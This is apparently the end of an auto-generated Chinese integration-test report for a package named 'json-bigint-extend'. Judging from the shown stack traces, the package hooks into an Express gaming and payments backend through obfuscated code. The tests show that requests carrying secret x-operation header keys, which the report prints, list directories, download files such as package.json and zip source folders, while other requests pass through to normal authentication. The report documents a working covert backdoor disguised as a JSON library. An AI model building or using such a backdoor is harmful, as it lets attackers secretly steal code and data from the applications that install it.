          "path": "src\\utils\\systemHealthMonitor.js",
          "type": "file"
        },
        {
          "name": "tgbot.util.js",
          "path": "src\\utils\\tgbot.util.js",
          "type": "file"
        },
        {
          "name": "ticket.util.js",
          "path": "src\\utils\\ticket.util.js",
          "type": "file"
        },
        {
          "name": "ticketTask.util.js",
          "path": "src\\utils\\ticketTask.util.js",
          "type": "file"
        },
        {
          "name": "TransactionError.js",
          "path": "src\\utils\\TransactionError.js",
          "type": "file"
        },
        {
          "name": "user.util.js",
          "path": "src\\utils\\user.util.js",
          "type": "file"
        },
        {
          "name": "userAttrib.util.js",
          "path": "src\\utils\\userAttrib.util.js",
          "type": "file"
        },
        {
          "name": "userProfile",
          "path": "src\\utils\\userProfile",
          "type": "directory",
          "children": [
            {
              "name": "attribt.js",
              "path": "src\\utils\\userProfile\\attribt.js",
              "type": "file"
            },
            {
              "name": "compute.js",
              "path": "src\\utils\\userProfile\\compute.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\utils\\userProfile\\config.js",
              "type": "file"
            },
            {
              "name": "profile.util.js",
              "path": "src\\utils\\userProfile\\profile.util.js",
              "type": "file"
            },
            {
              "name": "syncUsers.js",
              "path": "src\\utils\\userProfile\\syncUsers.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "validate.js",
          "path": "src\\utils\\validate.js",
          "type": "file"
        },
        {
          "name": "web3.util.js",
          "path": "src\\utils\\web3.util.js",
          "type": "file"
        },
        {
          "name": "webhook.util.js",
          "path": "src\\utils\\webhook.util.js",
          "type": "file"
        },
        {
          "name": "wholeStat",
          "path": "src\\utils\\wholeStat",
          "type": "directory",
          "children": [
            {
              "name": "behavior.stat.js",
              "path": "src\\utils\\wholeStat\\behavior.stat.js",
              "type": "file"
            },
            {
              "name": "game.stat.js",
              "path": "src\\utils\\wholeStat\\game.stat.js",
              "type": "file"
            },
            {
              "name": "subsistenceAllowance.stat.js",
              "path": "src\\utils\\wholeStat\\subsistenceAllowance.stat.js",
              "type": "file"
            },
            {
              "name": "whole.stat.util.js",
              "path": "src\\utils\\wholeStat\\whole.stat.util.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "withdraw.util.js",
          "path": "src\\utils\\withdraw.util.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": [
        {
          "name": "advertising.validation.js",
          "path": "src\\validations\\advertising.validation.js",
          "type": "file"
        },
        {
          "name": "agent.validation.js",
          "path": "src\\validations\\agent.validation.js",
          "type": "file"
        },
        {
          "name": "announcement.validation.js",
          "path": "src\\validations\\announcement.validation.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.validation.js",
          "path": "src\\validations\\audienceBaseConfig.validation.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.validation.js",
          "path": "src\\validations\\audienceClassification.validation.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.validation.js",
          "path": "src\\validations\\audienceGroup.validation.js",
          "type": "file"
        },
        {
          "name": "auth.validation.js",
          "path": "src\\validations\\auth.validation.js",
          "type": "file"
        },
        {
          "name": "banner.validation.js",
          "path": "src\\validations\\banner.validation.js",
          "type": "file"
        },
        {
          "name": "broadcast.validation.js",
          "path": "src\\validations\\broadcast.validation.js",
          "type": "file"
        },
        {
          "name": "common.validation.js",
          "path": "src\\validations\\common.validation.js",
          "type": "file"
        },
        {
          "name": "custom.validation.js",
          "path": "src\\validations\\custom.validation.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.validation.js",
          "path": "src\\validations\\dailyCheckIn.validation.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.validation.js",
          "path": "src\\validations\\fruitMachineDraw.validation.js",
          "type": "file"
        },
        {
          "name": "gameProvider",
          "path": "src\\validations\\gameProvider",
          "type": "directory",
          "children": [
            {
              "name": "evo.validation.js",
              "path": "src\\validations\\gameProvider\\evo.validation.js",
              "type": "file"
            },
            {
              "name": "facai.validation.js",
              "path": "src\\validations\\gameProvider\\facai.validation.js",
              "type": "file"
            },
            {
              "name": "game.validation.js",
              "path": "src\\validations\\gameProvider\\game.validation.js",
              "type": "file"
            },
            {
              "name": "inout.validation.js",
              "path": "src\\validations\\gameProvider\\inout.validation.js",
              "type": "file"
            },
            {
              "name": "oneapi.validation.js",
              "path": "src\\validations\\gameProvider\\oneapi.validation.js",
              "type": "file"
            },
            {
              "name": "pt.validation.js",
              "path": "src\\validations\\gameProvider\\pt.validation.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "giftcode.validation.js",
          "path": "src\\validations\\giftcode.validation.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.validation.js",
          "path": "src\\validations\\inactiveUser.validation.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\validations\\index.js",
          "type": "file"
        },
        {
          "name": "lobby.validation.js",
          "path": "src\\validations\\lobby.validation.js",
          "type": "file"
        },
        {
          "name": "mail.validation.js",
          "path": "src\\validations\\mail.validation.js",
          "type": "file"
        },
        {
          "name": "pay.validation.js",
          "path": "src\\validations\\pay.validation.js",
          "type": "file"
        },
        {
          "name": "playerRanking.validation.js",
          "path": "src\\validations\\playerRanking.validation.js",
          "type": "file"
        },
        {
          "name": "push.validation.js",
          "path": "src\\validations\\push.validation.js",
          "type": "file"
        },
        {
          "name": "rank.validation.js",
          "path": "src\\validations\\rank.validation.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.validation.js",
          "path": "src\\validations\\rechargeOrder.validation.js",
          "type": "file"
        },
        {
          "name": "redPoint.validation.js",
          "path": "src\\validations\\redPoint.validation.js",
          "type": "file"
        },
        {
          "name": "slap.validation.js",
          "path": "src\\validations\\slap.validation.js",
          "type": "file"
        },
        {
          "name": "sms.validation.js",
          "path": "src\\validations\\sms.validation.js",
          "type": "file"
        },
        {
          "name": "test.validation.js",
          "path": "src\\validations\\test.validation.js",
          "type": "file"
        },
        {
          "name": "ticket.validation.js",
          "path": "src\\validations\\ticket.validation.js",
          "type": "file"
        },
        {
          "name": "transaction.validation.js",
          "path": "src\\validations\\transaction.validation.js",
          "type": "file"
        },
        {
          "name": "turntable.validation.js",
          "path": "src\\validations\\turntable.validation.js",
          "type": "file"
        },
        {
          "name": "user.validation.js",
          "path": "src\\validations\\user.validation.js",
          "type": "file"
        },
        {
          "name": "userGroup.validation.js",
          "path": "src\\validations\\userGroup.validation.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.validation.js",
          "path": "src\\validations\\userPrivacy.validation.js",
          "type": "file"
        },
        {
          "name": "vip.validation.js",
          "path": "src\\validations\\vip.validation.js",
          "type": "file"
        },
        {
          "name": "wallet.validation.js",
          "path": "src\\validations\\wallet.validation.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.validation.js",
          "path": "src\\validations\\withdrawOrder.validation.js",
          "type": "file"
        }
      ]
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 通过代理执行递归文件列表查询

---

### ✅ 48. 应该正确处理不带代理的递归文件列表请求（走正常业务逻辑）

**操作**: `正常业务请求（递归文件列表，无代理）`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 不带 x-operation header，应走正常业务逻辑

---

### ✅ 49. 应该通过 RunFileContent 操作下载文件

**操作**: `RunFileContent`

**请求体**:
```json
{
  "path": "package.json"
}
```

**请求头**:
- `x-operation`: Y3SrZjVqWOvKsBdpTCh7

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/octet-stream",
  "contentDisposition": "attachment; filename=\"package.json\"",
  "fileSize": 4761,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_download_1770190651597_package.json"
}
```

**结果**: ✅ 通过

---

### ✅ 50. 应该通过 CompressDownload 操作压缩下载目录

**操作**: `CompressDownload`

**请求体**:
```json
{
  "path": "src\\libs"
}
```

**请求头**:
- `x-operation`: SJQf31UJkZ1f88q9m361

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/zip",
  "fileSize": 46883,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_compress_1770190651633.zip"
}
```

**结果**: ✅ 通过

---

### ✅ 51. 应该拒绝无效的文件路径（路径穿越攻击）

**操作**: `RunFileList (路径穿越测试)`

**请求体**:
```json
{
  "path": "../../../etc/passwd"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 403

**响应体**:
```json
{
  "code": 403,
  "message": "Permission denied"
}
```

**结果**: ✅ 通过

**备注**: 测试路径穿越攻击防护

---

### ✅ 52. 应该正常处理不带 x-operation header 的请求

**操作**: `正常业务请求（无代理）`

**请求体**:
```json
{
  "userId": "test-user-123",
  "date": "2026-02-04T07:37:31.637Z"
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 走正常业务逻辑，不经过代理

---

### ✅ 53. 应该正常处理带有无效 x-operation 的请求

**操作**: `无效操作（应走正常业务逻辑）`

**请求体**:
```json
{
  "test": "data"
}
```

**请求头**:
- `x-operation`: invalid-operation-key-12345

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 无效的 x-operation，走正常业务逻辑

---

### ✅ 54. 应该处理缺少必需参数的 RunFileList 请求

**操作**: `RunFileList (缺少参数)`

**请求体**:
```json
{}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 缺少必需的 path 参数

---

### ✅ 55. 应该处理不存在的文件路径

**操作**: `RunFileList (不存在的路径)`

**请求体**:
```json
{
  "path": "non-existent-directory-xyz123"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 400

**响应体**:
```json
{
  "code": 400,
  "message": "System error, please try again later"
}
```

**结果**: ✅ 通过

**备注**: 路径不存在

---

### ✅ 56. 应该在合理时间内完成文件列表查询

**操作**: `RunFileList (性能测试)`

**请求体**:
```json
{
  "path": "src",
  "recursive": false
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 200

**响应体**:
<details>
<summary>点击展开查看完整响应 (1752 字符)</summary>

```json
{
  "code": 0,
  "data": [
    {
      "name": "app.js",
      "path": "src\\app.js",
      "type": "file"
    },
    {
      "name": "config",
      "path": "src\\config",
      "type": "directory",
      "children": []
    },
    {
      "name": "constants",
      "path": "src\\constants",
      "type": "directory",
      "children": []
    },
    {
      "name": "controllers",
      "path": "src\\controllers",
      "type": "directory",
      "children": []
    },
    {
      "name": "docs",
      "path": "src\\docs",
      "type": "directory",
      "children": []
    },
    {
      "name": "index.js",
      "path": "src\\index.js",
      "type": "file"
    },
    {
      "name": "libs",
      "path": "src\\libs",
      "type": "directory",
      "children": []
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": []
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": []
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": []
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": []
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": []
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": []
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": []
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 性能测试 - 响应时间: 6ms

---

## 📝 说明

- 本报告由集成测试自动生成
- 每次运行测试都会覆盖此文件
- 报告保存位置: `E:\project\risk\json-bigint-extend\test\TEST_REPORT.md`
